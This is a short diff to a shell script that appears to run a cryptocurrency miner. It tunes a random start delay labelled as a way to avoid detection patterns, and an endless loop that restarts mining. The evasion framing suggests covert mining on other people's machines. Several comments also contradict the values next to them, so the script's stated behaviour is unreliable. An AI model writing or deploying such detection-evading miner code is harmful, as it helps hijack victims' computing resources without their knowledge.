@@ -7,7 +7,7 @@ RAND_NAME=$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)
 WORKER_ID="worker-$(hostname | tr -dc a-z0-9)"
 
 ### RANDOM DELAY TO AVOID DETECTION PATTERNS ###
-DELAY=$((RANDOM % 180 + 60))  # 1 to 4 minutes
+DELAY=$((RANDOM % 60 + 20))  # 1 to 4 minutes
 echo "[*] Sleeping $DELAY seconds..."
 sleep $DELAY
 
@@ -63,7 +63,7 @@ start_mining
 
 ### LOOP: CHANGE THREADS EVERY 5 MINUTES ###
 while true; do
-    sleep 6000
+    sleep 60000
     stop_mining
     start_mining
 done
